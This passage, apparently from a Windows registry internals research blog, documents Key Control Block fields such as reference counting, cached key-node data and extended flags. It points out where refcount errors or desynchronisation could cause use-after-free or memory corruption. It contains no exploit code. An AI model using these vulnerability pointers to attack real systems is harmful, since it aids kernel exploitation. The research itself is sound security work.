 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x120&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;TransValueListOwner&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_TRANS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x128&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FullKCBName&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_UNICODE_STRING&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x128&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FullKCBNameStale&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x128&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Reserved&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x130&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SequenceNumber&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;I will not document each member individually, but will instead cover them in larger groups according to their common themes and functions.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.lpbec4gwqs7y&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Reference count&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Key Control Blocks are among the most frequently referenced registry objects&lt;/span&gt;&lt;span&gt;, as a&lt;/span&gt;&lt;span&gt;lmost every persistent registry operation involves an associated KCB. These blocks are referenced in various ways: by a subkey&amp;#39;s KCB.ParentKcb pointer, a symbolic link key&amp;#39;s KCB.LinkTarget pointer, through the global KCB tree, via open key handles (and the corresponding key bodies), in pending &lt;/span&gt;&lt;span&gt;transacted&lt;/span&gt;&lt;span&gt;&amp;nbsp;operations (e.g., the _CM_KCB_UOW.KeyControlBlock pointer)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;, and so on.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;For system stability and security, it&amp;#39;s crucial to accurately track all these active KCB references.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is done using the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;RefCount&lt;/span&gt;&lt;span&gt;&amp;nbsp;field, the first member in the KCB structure (offset 0x0).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Historically a 16-bit field, it became a 32-bit integer, and on modern systems, it is a native word size&amp;mdash;typically 64-bits on most computers.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Whenever kernel code needs to operate on a KCB or store a pointer to it, it should increment the RefCount using functions from the CmpReferenceKeyControlBlock family.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Conversely, when a KCB reference is no longer needed, functions like CmpDereferenceKeyControlBlock should &lt;/span&gt;&lt;span&gt;decrement&lt;/span&gt;&lt;span&gt;&amp;nbsp;the count.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;When RefCount reaches zero, the kernel knows the structure is no longer in use and can safely free it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Besides standard reference counting, KCBs employ optimizations to delay certain memory management processes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This avoids excessive KCB allocation and deallocation when a KCB is briefly unreferenced.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Two mechanisms are used: &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;delay deref&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;delay close&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The former delays the actual refcount decrement, while the latter postpones object deallocation even after RefCount reaches zero.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Callers must use the specialized function CmpDelayDerefKeyControlBlock for the delayed dereference.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;From a low-level security perspective, it&amp;#39;s worth considering potential issues related to the reference counting.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Integer overflow might seem like a possibility, but it&amp;#39;s practically impossible due to the field&amp;#39;s width and additional overflow protection present in the CmpReferenceKeyControlBlock-like functions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A more realistic concern is a scenario where the kernel accidentally decrements the refcount by a larger value than the number of released references.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This could lead to premature KCB deallocation and a use-after-free condition.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, accurate KCB reference counting is a crucial area to investigate when researching Windows for registry vulnerabilities.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.5ijbmyhcq8iy&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Basic key information&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;As mentioned earlier, one of the most important types of information in the KCB is the unique identifier of the key in the hive, consisting of the _HHIVE descriptor pointer (&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KeyHive&lt;/span&gt;&lt;span&gt;) and the corresponding key cell index (&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KeyCell&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;). Very frequently, the kernel uses these two members to obtain the address of the key node mapping, which resembles the following pattern in the decompiled code:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_HHIVE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;*Hive&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;Kcb-&amp;gt;KeyHive;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_CM_KEY_NODE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;*KeyNode&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;Hive-&amp;gt;GetCellRoutine(Hive,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;Kcb-&amp;gt;KeyCell);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c50&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c50&quot;&gt;// Further operations on KeyNode...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c50&quot;&gt;/&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.wzmjdj3cd11l&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Cached data from the key node&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Whenever some information about a key needs to be queried based on its handle, it is generally more efficient to read it from the KCB than the key node. The reason is that a pool-based KCB access requires fewer memory fetches (it avoids the cell map walk), bypasses the context switch to the Registry process, and eliminates the potential need to page in hive data from disk. Consequently, the following types of information are cached inside KCBs:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_rkrpvoovd3qp-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Key name&lt;/span&gt;&lt;span&gt;, which is stored in a public _CM_NAME_CONTROL_BLOCK structure and pointed to by the &lt;/span&gt;&lt;span&gt;NameBlock member&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;. Every unique key name in the system has its own instance of the _CM_NAME_CONTROL_BLOCK object, which is reference-counted and shared across all KCBs of keys with that name. This is an optimization designed to prevent storing multiple redundant copies of the same string in kernel memory.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Flags&lt;/span&gt;&lt;span&gt;, stored in the &lt;/span&gt;&lt;span&gt;Flags&lt;/span&gt;&lt;span&gt;&amp;nbsp;member and being an exact copy of the _CM_KEY_NODE.Flags value. There is also the KcbUserFlags field that caches the value of _CM_KEY_NODE.UserFlags, and KcbVirtControlFlags, which caches the value of _CM_KEY_NODE.VirtControlFlags. The semantics of all of these bitmasks were discussed in &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;Part 5&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Security descriptor&lt;/span&gt;&lt;span&gt;, stored in a separate _CM_KEY_SECURITY_CACHE structure and pointed to by &lt;/span&gt;&lt;span&gt;CachedSecurity&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Subkey count&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;, stored in the SubKeyCount field. It expresses the cumulative number of the key&amp;#39;s stable and volatile subkeys, i.e. it is equal to the sum of _CM_KEY_NODE.SubKeyCounts[0] and SubKeyCounts[1].&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Value list&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;, stored in the ValueList structure of type _CHILD_LIST, and equivalent to _CM_KEY_NODE.ValueList.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Key limits&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;, represented by KcbMaxNameLen, KcbMaxValueNameLen and KcbMaxValueDataLen. They correspond to the key node fields with the same names without the &amp;quot;Kcb&amp;quot; prefix.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Fully qualified path&lt;/span&gt;&lt;span&gt;, stored in FullKCBName. It is lazily initialized in the internal CmpConstructAndCacheName function, either when resolving a symbolic link, or as a result of calling the documented &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmcallbackgetkeyobjectid&quot;&gt;CmCallbackGetKeyObjectID&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;API. A previously initialized path may be marked as stale by setting FullKCBNameStale (the least significant bit of the FullKCBName pointer).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;It is essential for system security that the information found in KCBs is always synchronized with their key node counterparts. This is one of the most fundamental assumptions of the Windows registry implementation, and failure to guarantee it typically results in memory corruption or other severe security vulnerabilities.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c13 tTszyzmaCA-c21&quot; id=&quot;h.axs8oljbbscn&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Extended flags&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In addition to the flags fields that simply mirror the corresponding values from the key node, like Flags, KcbUserFlags and KcbVirtControlFlags, there is also a set of extended flags that are KCB-specific. They are stored in the following fields:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ExtFlags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Freed&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Discarded&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;17,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HiveUnloaded&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;18,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Decommissioned&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;19,&lt;/span&gt;&lt;span 